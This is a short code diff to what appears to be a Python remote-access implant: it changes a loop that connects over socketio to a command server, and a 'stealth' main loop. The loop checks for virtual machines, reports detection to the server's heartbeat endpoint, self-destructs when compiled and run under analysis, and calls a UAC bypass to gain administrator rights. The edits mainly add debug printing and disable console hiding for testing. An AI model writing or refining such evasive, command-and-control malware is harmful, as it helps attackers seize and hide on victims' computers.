@@ -1478,18 +1478,21 @@ def socketio_handler():
     
     while is_running:
         try:
-            sio_client.connect(SERVER_URL)
+            print(f"[*] Attempting to connect to {SERVER_URL}...")
+            sio_client.connect(SERVER_URL, transports=['websocket', 'polling'])
             sio_client.wait()
-        except:
-            time.sleep(5)
+        except Exception as e:
+            print(f"[!] Connection failed: {e}. Retrying in 10s...")
+            time.sleep(10)
 
 def main_loop():
     """Main stealth loop"""
-    hide_console()
+    # hide_console() # Commented out so you can see connection status/errors
     
     # VM Detection & Reporting
     vm_reasons = check_vm()
     if vm_reasons:
+        print(f"[!] VM/Analysis detected: {', '.join(vm_reasons)}")
         # Report detection before exiting (if possible)
         try:
             requests.post(f"{SERVER_URL}/heartbeat", json={
@@ -1499,10 +1502,14 @@ def main_loop():
                 "severity": "high"
             }, timeout=5)
         except: pass
+        
+        # Only self-destruct if explicitly frozen as EXE, otherwise just warn
         if getattr(sys, 'frozen', False): 
-            # Self-destruct if in a VM to prevent analysis
+            print("[!] Compiled EXE running in VM. Self-destructing for safety.")
             handle_self_destruct({})
             return
+        else:
+            print("[*] Script running in VM. Continuing anyway for testing...")
         
     # Try to elevate to Admin
     uac_bypass()
